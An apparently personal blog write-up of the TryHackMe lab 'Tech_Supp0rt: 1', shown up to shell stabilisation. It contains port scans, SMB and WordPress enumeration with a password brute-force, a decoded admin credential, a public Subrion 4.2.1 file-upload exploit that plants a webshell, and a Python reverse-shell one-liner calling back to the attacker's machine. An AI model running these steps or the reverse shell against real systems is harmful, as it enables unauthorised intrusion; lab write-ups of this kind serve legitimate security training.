<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  
  <link rel="apple-touch-icon" sizes="180x180" href="/new_blog/assets/favicon/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/new_blog/assets/favicon/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/new_blog/assets/favicon/favicon-16x16.png">
  <link rel="manifest" href="/new_blog/assets/favicon/site.webmanifest">
  <link rel="mask-icon" href="/new_blog/assets/favicon/safari-pinned-tab.svg" color="#5bbad5"> 
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
  
  <title>The Awesome Blog | Tech Supp0rt 1</title>
  
  <link rel="stylesheet" href="/new_blog/assets/css/post.css" />
  <link rel="stylesheet" href="/new_blog/assets/css/syntax.css" />
  
  <link rel="stylesheet" href="/new_blog/assets/css/common.css" />
  <script src="/new_blog/assets/js/categories.js"></script>
  
  <script defer src="/new_blog/assets/js/lbox.js"></script>
  
</head>

  <body>
    <main>
      <header>
  <a class="site-title" href="/new_blog/">The Awesome Blog</a>
</header>

      <section class="article">
        <div class="article-header">
          <h2 class="article-title">Tech Supp0rt 1</h2>
          <small class="date">19 Apr 2022</small>
          <div class="categories">
            
            <a href="#!" class="category">Web</a>
            
            <a href="#!" class="category">Subrion</a>
            
            <a href="#!" class="category">Tryhackme</a>
            
          </div>
        </div>
        <div class="content">
<blockquote>
  <p>VOiD XD</p>
</blockquote>

<p>This is short writup for <a href="https://tryhackme.com/room/techsupp0rt1">Tech_Supp0rt: 1</a> (Hack into the scammer‚Äôs under-development website to foil their plans.) on <a href="https://tryhackme.com">tryhackme</a>
Go check it out.</p>

<blockquote>
  <p>Target IP : 168.119.142.36</p>
</blockquote>

<h3 id="rustscan">Rustscan</h3>
<p>Rustscan for quick open ports lookup.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># All ports scan</span>
rustscan <span class="nt">-a</span> 10.10.203.0 <span class="nt">-b</span> 1000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
| .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
<span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
üåçHACK THE PLANETüåç

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '</span><span class="nt">-b</span> 924<span class="s1">'.
Open 10.10.203.0:22
Open 10.10.203.0:80
Open 10.10.203.0:139
Open 10.10.203.0:445
[~] Starting Script(s)
[&gt;] Script to be run Some("nmap -vvv -p  ")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 05:30 EDT
Initiating Ping Scan at 05:30
Scanning 10.10.203.0 [2 ports]
Completed Ping Scan at 05:30, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:30
Completed Parallel DNS resolution of 1 host. at 05:30, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 05:30
Scanning 10.10.203.0 [4 ports]
Discovered open port 80/tcp on 10.10.203.0
Discovered open port 445/tcp on 10.10.203.0
Discovered open port 139/tcp on 10.10.203.0
Discovered open port 22/tcp on 10.10.203.0
Completed Connect Scan at 05:30, 0.29s elapsed (4 total ports)
Nmap scan report for 10.10.203.0
Host is up, received syn-ack (0.24s latency).
Scanned at 2022-04-19 05:30:38 EDT for 1s

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack
80/tcp  open  http         syn-ack
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
</span></code></pre></div></div>

<h2 id="nmap">Nmap</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Version and Service Scans</span>

nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-vv</span> 10.10.203.0 <span class="nt">-oN</span> scans/init 
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-04-19 05:28 EDT
NSE: Loaded 155 scripts <span class="k">for </span>scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 05:28
Completed NSE at 05:28, 0.00s elapsed
NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 05:28
Completed NSE at 05:28, 0.00s elapsed
NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 05:28
Completed NSE at 05:28, 0.00s elapsed
Initiating Ping Scan at 05:28
Scanning 10.10.203.0 <span class="o">[</span>2 ports]
Completed Ping Scan at 05:28, 0.28s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating Parallel DNS resolution of 1 host. at 05:28
Completed Parallel DNS resolution of 1 host. at 05:28, 0.02s elapsed
Initiating Connect Scan at 05:28
Scanning 10.10.203.0 <span class="o">[</span>1000 ports]
Discovered open port 139/tcp on 10.10.203.0
Discovered open port 445/tcp on 10.10.203.0
Discovered open port 22/tcp on 10.10.203.0
Discovered open port 80/tcp on 10.10.203.0
Increasing send delay <span class="k">for </span>10.10.203.0 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay <span class="k">for </span>10.10.203.0 from 5 to 10 due to max_successful_tryno increase to 5
Completed Connect Scan at 05:28, 29.82s elapsed <span class="o">(</span>1000 total ports<span class="o">)</span>
Initiating Service scan at 05:28
Scanning 4 services on 10.10.203.0
Completed Service scan at 05:29, 11.82s elapsed <span class="o">(</span>4 services on 1 host<span class="o">)</span>
NSE: Script scanning 10.10.203.0.
NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 05:29
Completed NSE at 05:29, 9.83s elapsed
NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 05:29
Completed NSE at 05:29, 1.44s elapsed
NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 05:29
Completed NSE at 05:29, 0.00s elapsed
Nmap scan report <span class="k">for </span>10.10.203.0
Host is up, received syn-ack <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-04-19 05:28:29 EDT <span class="k">for </span>54s
Not shown: 995 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT     STATE    SERVICE     REASON      VERSION
22/tcp   open     ssh         syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtST3F95eem6k4V02TcUi7/Qtn3WvJGNfqpbE+7EVuN2etoFpihgP5LFK2i/EDbeIAiEPALjtKy3gFMEJ5QDCkglBYt3gUbYv29TQBdx+LZQ8Kjry7W+KCKXhkKJEVnkT5cN6lYZIGAkIAVXacZ/YxWjj+ruSAx07fnNLMkqsMR9VA+8w0L2BsXhzYAwCdWrfRf8CE1UEdJy6WIxRsxIYOk25o9R44KXOWT2F8pP2tFbNcvUMlUY6jGHmXgrIEwDiBHuwd3uG5cVVmxJCCSY6Ygr9Aa12nXmUE5QJE9lisYIPUn9IjbRFb2d2hZE2jQHq3WCGdAls2Bwnn7Rgc7J09
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBClT+wif/EERxNcaeTiny8IrQ5Qn6uEM7QxRlouee7KWHrHXomCB/Bq4gJ95Lx5sRPQJhGOZMLZyQaKPTIaILNQ<span class="o">=</span>
|   256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDolvqv0mvkrpBMhzpvuXHjJlRv/vpYhMabXxhkBxOwz
80/tcp   open     http        syn-ack     Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
139/tcp  open     netbios-ssn syn-ack     Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
445/tcp  open     netbios-ssn syn-ack     Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
6792/tcp filtered unknown     no-response
Service Info: Host: TECHSUPPORT<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2022-04-19T09:29:16
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 <span class="o">(</span>Samba 4.3.11-Ubuntu<span class="o">)</span>
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT<span class="se">\x</span>00
|   Domain name: <span class="se">\x</span>00
|   FQDN: techsupport
|_  System <span class="nb">time</span>: 2022-04-19T14:59:14+05:30
| p2p-conficker: 
|   Checking <span class="k">for </span>Conficker.C or higher...
|   Check 1 <span class="o">(</span>port 55287/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Couldn<span class="s1">'t connect)
|   Check 2 (port 30605/tcp): CLEAN (Couldn'</span>t connect<span class="o">)</span>
|   Check 3 <span class="o">(</span>port 34806/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 4 <span class="o">(</span>port 30218/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Failed to receive data<span class="o">)</span>
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: <span class="nt">-1h49m58s</span>, deviation: 3h10m30s, median: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 05:29
Completed NSE at 05:29, 0.00s elapsed
NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 05:29
Completed NSE at 05:29, 0.00s elapsed
NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 05:29
Completed NSE at 05:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>54.48 second
</code></pre></div></div>

<h2 id="port-139-smb">PORT 139 [smb]</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Smb Enumeration</span>
smbclient <span class="nt">-L</span> 10.10.203.0
Enter WORKGROUP<span class="se">\k</span>alis password: 

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	print<span class="nv">$ </span>         Disk      Printer Drivers
	websvr          Disk      
	IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>TechSupport server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.

	Server               Comment
	<span class="nt">---------</span>            <span class="nt">-------</span>

	Workgroup            Master
	<span class="nt">---------</span>            <span class="nt">-------</span>
	WORKGROUP  


smbclient <span class="se">\\\\</span>10.10.203.0<span class="se">\\</span>websvr
Enter WORKGROUP<span class="se">\k</span>alis password: 
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sat May 29 03:17:38 2021
  ..                                  D        0  Sat May 29 03:03:47 2021
  enter.txt                           N      273  Sat May 29 03:17:38 2021

		8460484 blocks of size 1024. 5698820 blocks available


smb: <span class="se">\&gt;</span> get enter.txt
getting file <span class="se">\e</span>nter.txt of size 273 as enter.txt <span class="o">(</span>0.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.3 KiloBytes/sec<span class="o">)</span>


</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Reading file we got</span>
<span class="nb">cat </span>enter.txt         
GOALS
<span class="o">=====</span>
1<span class="o">)</span>Make fake popup and host it online on Digital Ocean server
2<span class="o">)</span>Fix subrion site, /subrion doesnt work, edit from panel
3<span class="o">)</span>Edit wordpress website

IMP
<span class="o">===</span>
Subrion creds
|-&gt;admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk <span class="o">[</span>cooked with magical formula]
Wordpress creds
|-&gt;

<span class="c"># Using cyberchef to decode </span>
7sKvntXdPEJaxazce9PXi24zaFrLiKWCk <span class="nt">--</span><span class="o">&gt;</span> from base58 <span class="nt">--</span><span class="o">&gt;</span> from <span class="nb">base32</span> <span class="nt">--</span><span class="o">&gt;</span>from <span class="nb">base64</span> <span class="nt">--</span><span class="o">&gt;</span> gives Scam2021
</code></pre></div></div>

<h2 id="port-80-http">PORT 80 [http]</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Directory Enumeration</span>

gobuster <span class="nb">dir</span> <span class="nt">--url</span> http://10.10.203.0 <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/dirb/common.txt <span class="nt">-t</span> 40 | <span class="nb">tee </span>go.log
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.10.203.0
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 40
<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2022/04/19 05:43:13 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 11321]
/phpinfo.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 94954]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]  
/test                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.203.0/test/]
/wordpress            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.203.0/wordpress/]
                                                                                     
<span class="o">===============================================================</span>
2022/04/19 05:43:49 Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<p>Checking out findings</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># /test</span>
http://10.10.203.0/test/ <span class="nt">--</span><span class="o">&gt;</span> gives sample of the <span class="nb">test </span>error page
<span class="c"># nothing important</span>

<span class="c"># /phpinfo.php</span>
10.10.203.0/phpinfo.php  <span class="nt">--</span><span class="o">&gt;</span> gives all the information about the server
CONTEXT_DOCUMENT_ROOT 	/var/www/html 
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Wordpress Enumeration</span>

http://10.10.203.0/wordpress/  <span class="nt">--</span><span class="o">&gt;</span> using wpscan to enumerate

wpscan <span class="nt">--url</span> http://10.10.203.0/wordpress/ <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ¬Æ
           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.203.0/wordpress/ [10.10.203.0]
[+] Started: Wed Apr 20 11:39:49 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.203.0/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.203.0/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.203.0/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.203.0/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.203.0/wordpress/, Match: '</span>wp-includes<span class="se">\/</span>js<span class="se">\/</span>wp-emoji-release.min.js?ver<span class="o">=</span>5.7.2<span class="s1">'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.203.0/wordpress/, Match: '</span>WordPress 5.7.2

<span class="o">[</span>+] WordPress theme <span class="k">in </span>use: teczilla
 | Location: http://10.10.203.0/wordpress/wp-content/themes/teczilla/
 | Last Updated: 2021-11-17T00:00:00.000Z
 | Readme: http://10.10.203.0/wordpress/wp-content/themes/teczilla/readme.txt
 | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 1.1.3
 | Style URL: http://10.10.203.0/wordpress/wp-content/themes/teczilla/style.css?ver<span class="o">=</span>5.7.2
 | Style Name: Teczilla
 | Style URI: https://www.avadantathemes.com/product/teczilla-free/
 | Description: Teczilla is a creative, fully customizable and multipurpose theme that you can use to create any kin...
 | Author: avadantathemes
 | Author URI: https://www.avadantathemes.com/
 |
 | Found By: Css Style In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
 |
 | Version: 1.0.4 <span class="o">(</span>80% confidence<span class="o">)</span>
 | Found By: Style <span class="o">(</span>Passive Detection<span class="o">)</span>
 |  - http://10.10.203.0/wordpress/wp-content/themes/teczilla/style.css?ver<span class="o">=</span>5.7.2, Match: <span class="s1">'Version: 1.0.4'</span>

<span class="o">[</span>+] Enumerating All Plugins <span class="o">(</span>via Passive Methods<span class="o">)</span>

<span class="o">[</span>i] No plugins Found.

<span class="o">[</span>+] Enumerating Config Backups <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
 Checking Config Backups - Time: 00:00:06 &lt;<span class="o">===============================================================================================================&gt;</span> <span class="o">(</span>137 / 137<span class="o">)</span> 100.00% Time: 00:00:06

<span class="o">[</span>i] No Config Backups Found.

<span class="o">[</span>+] Enumerating Users <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
 Brute Forcing Author IDs - Time: 00:00:03 &lt;<span class="o">================================================================================================================&gt;</span> <span class="o">(</span>10 / 10<span class="o">)</span> 100.00% Time: 00:00:03

<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+] support
 | Found By: Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://10.10.203.0/wordpress/index.php/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] Performing password attack on Xmlrpc against 1 user/s
^Cying support / dimple Time: 00:09:27 &lt;                                                                                                             <span class="o">&gt;</span> <span class="o">(</span>1500 / 14344392<span class="o">)</span>  0.01%  ETA: ??:??:??
<span class="o">[</span>i] No Valid Passwords Found.

<span class="o">[!]</span> No WPScan API Token given, as a result vulnerability data has not been output.                                                                   <span class="o">&gt;</span> <span class="o">(</span>1504 / 14344392<span class="o">)</span>  0.01%  ETA: ??:??:??
<span class="o">[!]</span> You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

<span class="o">[</span>+] Finished: Wed Apr 20 11:50:00 2022
<span class="o">[</span>+] Requests Done: 1695
<span class="o">[</span>+] Cached Requests: 7
<span class="o">[</span>+] Data Sent: 859.634 KB
<span class="o">[</span>+] Data Received: 1.442 MB
<span class="o">[</span>+] Memory used: 238.305 MB
<span class="o">[</span>+] Elapsed <span class="nb">time</span>: 00:10:11

Scan Aborted: Canceled by User

<span class="c"># Nothing important was found except support user.</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># /subrion

Fix subrion site, /subrion doesnt work, edit from panel

but /subrion redirects us to {our_local_ip}/subrion/subrion

tried to look into burp and all for long time.

guessed /subrion/panel may work.

And it did!

we already have creds

admin:Scam2021

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Subrion enumeration gives</span>

Subrion version 4.2.1 installed. Cheers!

searchsploit  Subrion   
<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                              |  Path
<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Subrion 3.x - Multiple Vulnerabilities                      | php/webapps/38525.txt
Subrion 4.2.1 - <span class="s1">'Email'</span> Persistant Cross-Site Scripting     | php/webapps/47469.txt
Subrion Auto Classifieds - Persistent Cross-Site Scripting  | php/webapps/14391.txt
SUBRION CMS - Multiple Vulnerabilities                      | php/webapps/17390.txt
Subrion CMS 2.2.1 - Cross-Site Request Forgery <span class="o">(</span>Add Admin<span class="o">)</span>  | php/webapps/21267.txt
subrion CMS 2.2.1 - Multiple Vulnerabilities                | php/webapps/22159.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery <span class="o">(</span>Add Admin<span class="o">)</span>  | php/webapps/47851.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Per | php/webapps/40553.txt
Subrion CMS 4.0.5 - SQL Injection                           | php/webapps/40202.txt
Subrion CMS 4.2.1 - <span class="s1">'avatar[path]'</span> XSS                      | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                   | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross-Site Scripting                    | php/webapps/45150.txt
<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results



searchsploit  <span class="nt">-m</span> php/webapps/49876.py
  Exploit: Subrion CMS 4.2.1 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/49876
     Path: /usr/share/exploitdb/exploits/php/webapps/49876.py
File Type: Python script, ASCII text executable, with very long lines <span class="o">(</span>956<span class="o">)</span>

Copied to: /home/kali/TryHackMe/Tech_Support/49876.py

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Gaining Access</span>

‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/TryHackMe/Tech_Support]
‚îî‚îÄ<span class="nv">$ </span>python3 exploit.py 
<span class="o">[</span>+] Specify an url target
<span class="o">[</span>+] Example usage: exploit.py <span class="nt">-u</span> http://target-uri/panel
<span class="o">[</span>+] Example <span class="nb">help </span>usage: exploit.py <span class="nt">-h</span>
                                                                                              
‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/TryHackMe/Tech_Support]
‚îî‚îÄ<span class="nv">$ </span>python3 exploit.py <span class="nt">-h</span>
Usage: exploit.py <span class="o">[</span>options]

Options:
  <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
  <span class="nt">-u</span> URL, <span class="nt">--url</span><span class="o">=</span>URL     Base target uri http://target/panel
  <span class="nt">-l</span> USER, <span class="nt">--user</span><span class="o">=</span>USER  User credential to login
  <span class="nt">-p</span> PASSW, <span class="nt">--passw</span><span class="o">=</span>PASSW
                        Password credential to login
                                                                                              
‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/TryHackMe/Tech_Support]
‚îî‚îÄ<span class="nv">$ </span>python3 exploit.py <span class="nt">-u</span> http://10.10.203.0/subrion/panel/ <span class="nt">-l</span> admin <span class="nt">-p</span> Scam2021
<span class="o">[</span>+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

<span class="o">[</span>+] Trying to connect to: http://10.10.203.0/subrion/panel/
<span class="o">[</span>+] Success!
<span class="o">[</span>+] Got CSRF token: UiWXFvBttTMBZWjVxBCfNFJsnoX6hxdNrOeMwlvW
<span class="o">[</span>+] Trying to log <span class="k">in</span>...
<span class="o">[</span>+] Login Successful!

<span class="o">[</span>+] Generating random name <span class="k">for </span>Webshell...
<span class="o">[</span>+] Generated webshell name: rlccyhomkqkrtwl

<span class="o">[</span>+] Trying to Upload Webshell..
<span class="o">[</span>+] Upload Success... Webshell path: http://10.10.203.0/subrion/panel/uploads/rlccyhomkqkrtwl.phar 

<span class="nv">$ </span>

Yay we got our shell

Stablizing shell

<span class="nv">$ </span>which python3
/usr/bin/python3

<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.253.221",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
</code></pre></div></div>

<h2 id="shell-www-data">Shell [www-data]</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#  Shell Stablization</span>

‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/TryHackMe/Tech_Support]
‚îî‚îÄ<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 4444                                
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.8.253.221] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.203.0] 41394
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off

$ python3 -c '</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'

www-data@TechSupport:/var/www/html/subrion/uploads$

www-data@TechSupport:/var/www/html/subrion/uploads$ export TERM=xterm
export TERM=xterm

ctrl+z
zsh: suspended  nc -nlvp 4444


‚îå‚îÄ‚îÄ(kali„âøkali)-[~/TryHackMe/Tech_Support]
